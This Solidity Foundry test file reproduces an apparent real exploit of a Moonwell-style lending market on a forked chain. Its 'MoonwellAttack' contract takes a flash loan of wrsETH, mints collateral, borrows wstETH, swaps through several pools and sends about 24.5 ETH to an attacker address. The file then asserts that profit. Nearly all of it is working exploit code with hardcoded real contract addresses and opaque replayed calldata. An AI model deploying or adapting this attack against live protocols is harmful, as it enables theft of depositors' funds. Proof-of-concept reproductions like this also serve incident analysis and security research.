
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 37722881;
    uint256 constant TX_TIMESTAMP = 1762235111;
    uint256 constant TX_BLOCK_NUMBER = 37722882;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        MoonwellAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (MoonwellAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = MoonwellAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new MoonwellAttack();
        }
    }

    function _prepareProfit(MoonwellAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(MoonwellAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_contract, attack, Addresses.mwrsETH, "mwrsETH", 103747);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 24522894229480624092);
    }
}

contract MoonwellAttack {
    function attack() external payable {
        startWrsEthFlashLoan();
        readBorrowedWrsEth();
        swapWrsEthForWeth();
        readWethBalance();
        withdrawWeth();
        sendEthProfit();
    }

    function startWrsEthFlashLoan() internal {
        bytes memory flashPath =
            hex"07edfa23602d0ec14714057867a78d01e94176bea009edfa23602d0ec14714057867a78d01e94176bea0000044095ea7b3000000000000000000000000fc41b49d064ac646015b459c522820db9472f4b500000000000000000000000000000000000000000000000000000000000000000aedfa23602d0ec14714057867a78d01e94176bea0000024095ea7b3000000000000000000000000fc41b49d064ac646015b459c522820db9472f4b500000afc41b49d064ac646015b459c522820db9472f4b5000004a0712d68000009fbb21d0380bee3312b33c4353c8936a0f13ef26c000064c299823800000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000fc41b49d064ac646015b459c522820db9472f4b509627fe393bc6edda28e99ae648fd6ff362514304b000024c5ebeaec0000000000000000000000000000000000000000000000011dc5d30f8ba4fcc007c1cba3fcea344f92d9239c08c0568f6f2f0ee4520100861a2922be165a5bd41b1e482b49216b465e1b5f00000000000000000000000000000000000000000000000000000000000000000001074200000000000000000000000000000000000006010016e25facba67a40da3436ab9e2e00c30dab0dd9700000000000000000000000000000000000000000000000000000000000000000101";
        ICLPool(Addresses.CLPool).flash(address(this), 0, 20782357954960, flashPath);
    }

    function readBorrowedWrsEth() internal {
        IERC20Like(Addresses.wrsETH).balanceOf(address(this));
    }

    function swapWrsEthForWeth() internal {
        int256 wrsEthSwapAmount = 23562550047427472211;
        IUniswapV3Pool(Addresses.UniswapV3Pool)
            .swap(
                address(this),
                false,
                wrsEthSwapAmount,
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                hex""
            );
    }

    function readWethBalance() internal {
        IERC20Like(Addresses.WETH).balanceOf(address(this));
    }

    function withdrawWeth() internal {
        uint256 wethAmount = 24917534577559974182;
        IWETH(Addresses.WETH).withdraw(wethAmount);
    }

    function sendEthProfit() internal {
        uint256 ethProfit = address(this).balance;
        if (ethProfit > 24917534577559974182) ethProfit = 24917534577559974182;
        (bool ok,) = payable(Addresses.attacker_eoa).call{value: ethProfit}("");
        if (!ok) {}
    }

    function flashCallback() internal {
        didFlashCallback = true;
        flashCallback2();
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
        flashCallback8();
        flashCallback9();
        flashCallback10();
        flashCallback11();
        flashCallback12();
        flashCallback13();
        flashCallback14();
    }

    function flashCallback2() internal {
        ICLPool(Addresses.CLPool).token1();
    }

    function flashCallback3() internal {
        IERC20Like(Addresses.wrsETH).balanceOf(address(this));
    }

    function flashCallback4() internal {
        IERC20Like(Addresses.wrsETH).balanceOf(address(this));
    }

    function flashCallback5() internal {
        IERC20Like(Addresses.wrsETH).approve(Addresses.mwrsETH, 0);
    }

    function flashCallback6() internal {
        uint256 wrsEthAllowance = 20782357954960;
        IERC20Like(Addresses.wrsETH).approve(Addresses.mwrsETH, wrsEthAllowance);
    }

    function flashCallback7() internal {
        uint256 mwrsETHMintAmount = 20782357954960;
        ImwrsETH(Addresses.mwrsETH).mint(mwrsETHMintAmount);
    }

    function flashCallback8() internal {
        IUnitroller(Addresses.Unitroller).enterMarkets(_addressArray1(Addresses.mwrsETH));
    }

    function flashCallback9() internal {
        ImwstETH(Addresses.mwstETH).borrow(20592096934942276800);
    }

    function flashCallback10() internal {
        IERC20Like(Addresses.wstETH_E452).balanceOf(address(this));
    }

    function flashCallback11() internal {
        int256 wstEthSwapAmount = 20592096934942276800;
        ICLPool_1B5F(Addresses.CLPool_1B5F)
            .swap(
                address(this),
                false,
                wstEthSwapAmount,
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                hex""
            );
    }

    function flashCallback12() internal {
        IERC20Like(Addresses.WETH).balanceOf(address(this));
    }

    function flashCallback13() internal {
        int256 wethSwapAmount = 25067656116987500521;
        IUniswapV3Pool(Addresses.UniswapV3Pool)
            .swap(address(this), true, wethSwapAmount, uint160(4295128740), hex"");
    }

    function flashCallback14() internal {
        IERC20Like(Addresses.wrsETH).transfer(Addresses.CLPool, 20784436190756);
    }

    function settleWstEthPool() internal {
        didWstEthCallback = true;
        readWstEthPoolToken();
        repayWstEthSwap();
    }

    function readWstEthPoolToken() internal {
        ICLPool_1B5F(Addresses.CLPool_1B5F).token1();
    }

    function repayWstEthSwap() internal {
        IERC20Like(Addresses.wstETH_E452).transfer(Addresses.CLPool_1B5F, 20592096934942276800);
    }

    function settleWrsEthPool() internal {
        didWrsEthCallback = true;
        readWrsEthPoolToken();
        repayWrsEthSwap();
    }

    function readWrsEthPoolToken() internal {
        IUniswapV3Pool(Addresses.UniswapV3Pool).token1();
    }

    function repayWrsEthSwap() internal {
        uint256 wrsEthRepayment = 23562550047427472211;
        IERC20Like(Addresses.wrsETH).transfer(Addresses.UniswapV3Pool, wrsEthRepayment);
    }

    function settleWethPool() internal {
        didWethCallback = true;
        readWethPoolToken();
        repayWethSwap();
    }

    function readWethPoolToken() internal {
        IUniswapV3Pool(Addresses.UniswapV3Pool).token0();
    }

    function repayWethSwap() internal {
        uint256 wethRepayment = 25067656116987500521;
        IERC20Like(Addresses.WETH).transfer(Addresses.UniswapV3Pool, wethRepayment);
    }

    receive() external payable {}

    function approve(address spender, uint256 allowance) external payable {
        spender;
        allowance;
        startWrsEthFlashLoan();
        readBorrowedWrsEth();
        swapWrsEthForWeth();
        readWethBalance();
        withdrawWeth();
        sendEthProfit();
        bytes memory ret = hex"00000000000000000000000000000000000000000000000159ccddadf5f9b126";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        amount0;
        amount1;
        data;
        if (!didFlashCallback) flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0xfa461e33) {
            (uint256 amount0Delta, uint256 amount1Delta) = _v3Deltas();
            if (msg.sender == Addresses.CLPool_1B5F && amount1Delta > 0 && amount1Delta < (1 << 255)) {
                if (!didWstEthCallback) settleWstEthPool();
                return;
            }
            if (msg.sender == Addresses.UniswapV3Pool && amount0Delta > 0 && amount0Delta < (1 << 255)) {
                if (!didWethCallback) settleWethPool();
                return;
            }
            if (msg.sender == Addresses.UniswapV3Pool && amount1Delta > 0 && amount1Delta < (1 << 255)) {
                if (!didWrsEthCallback) settleWrsEthPool();
                return;
            }
            if (!didWstEthCallback) settleWstEthPool();
            return;
        }
        entryCallback();
    }

    function entryCallback() internal {}

    function _v3Deltas() internal pure returns (uint256 amount0Delta, uint256 amount1Delta) {
        assembly {
            amount0Delta := calldataload(4)
            amount1Delta := calldataload(36)
        }
    }

    bool private didFlashCallback;
    bool private didWstEthCallback;
    bool private didWrsEthCallback;
    bool private didWethCallback;

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant RsETHTokenWrapper = 0x0223949fc1ed591ad24892085ac37a6AeCd81494;
    address internal constant CLPool = 0x14dcCDd311Ab827c42CCA448ba87B1ac1039e2A4;
    address internal constant UniswapV3Pool = 0x16e25fAcBA67a40dA3436ab9E2E00C30daB0dD97;
    address internal constant FiatTokenV2_2 = 0x1f72BF05B43e275e96bBCcb0Bc40F7E5C9656527;
    address internal constant MErc20Delegate = 0x1FADFF493529C3Fcc7EE04F1f15D19816ddA45B7;
    address internal constant tBTC = 0x236aa50979D5f3De3Bd1Eeb40E81137F22ab794b;
    address internal constant FiatTokenV2_2_D779 = 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779;
    address internal constant L2TBTC = 0x41C9b5639E3F2F6C61e9B78b2c6FF3746E79d91A;
    address internal constant WETH = 0x4200000000000000000000000000000000000006;
    address internal constant attack_contract = 0x42Ecd332D47C91CbC83B39bD7f53CEbe5E9734bB;
    address internal constant EURC = 0x60a3E35Cc302bFA44Cb288Bc5a4F316Fdb1adb42;
    address internal constant mwstETH = 0x627Fe393Bc6EdDA28e99AE648fD6fF362514304b;
    address internal constant attacker_eoa = 0x6997a8c804642AE2de16D7B8Ff09565a5D5658ff;
    address internal constant wstETH = 0x69ce2505CE515C0203160450157366F927243309;
    address internal constant MErc20Delegator = 0x73902f619CEB9B31FD8EFecf435CbDf89E369Ba6;
    address internal constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address internal constant CLPool_1B5F = 0x861A2922bE165a5Bd41b1E482B49216b465e1B5F;
    address internal constant AERO = 0x940181a94A35A4569E4529A3CDfB74e38FD98631;
    address internal constant MErc20Delegator_A218 = 0x9A858ebfF1bEb0D3495BB0e2897c1528eD84A218;
    address internal constant TransparentUpgradeableProxy_A88594 = 0xA88594D404727625A9437C3f886C7643872296AE;
    address internal constant MErc20Delegator_E86D = 0xb4fb8fed5b3AaA8434f0B19b1b623d977e07e86d;
    address internal constant MErc20Delegator_01A2 = 0xb682c840B5F4FC58B20769E691A6fa1305A501a2;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant wstETH_E452 = 0xc1CBa3fCea344f92D9239c08C0568f6F2F0ee452;
    address internal constant cbXRP = 0xcb585250f852C6c6bf90434AB21A00f02833a4af;
    address internal constant TransparentUpgradeableProxy_E9005B = 0xe9005b078701e2A0948D2EaC43010D35870Ad9d2;
    address internal constant MErc20Delegator_6C22 = 0xEdc817A28E8B93B03976FBd4a3dDBc9f7D176c22;
    address internal constant wrsETH = 0xEDfa23602D0EC14714057867A78d01e94176BEA0;
    address internal constant Unitroller = 0xfBb21d0380beE3312B33c4353c8936a0F13EF26C;
    address internal constant mwrsETH = 0xfC41B49d064Ac646015b459C522820DB9472F4B5;
    address internal constant BridgeToken = 0xFF8adeC2221f9f4D8dfbAFa6B9a297d17603493D;
    address internal constant A_FFFD89_8D25 = 0xfFfd8963EFd1fC6A506488495d951d5263988d25;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface ICLPool {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token1() external view returns (uint256);
}

interface ICLPool_1B5F {
    function swap(address, bool, int256, uint160, bytes calldata) external;
    function token1() external view returns (uint256);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV3Pool {
    function swap(address, bool, int256, uint160, bytes calldata) external;
    function token0() external view returns (uint256);
    function token1() external view returns (uint256);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUnitroller {
    function enterMarkets(address[] calldata) external;
}

interface IWETH {
    function withdraw(uint256) external;
}

interface ImwrsETH {
    function mint(uint256) external returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}

interface ImwstETH {
    function borrow(uint256) external returns (uint256);
}
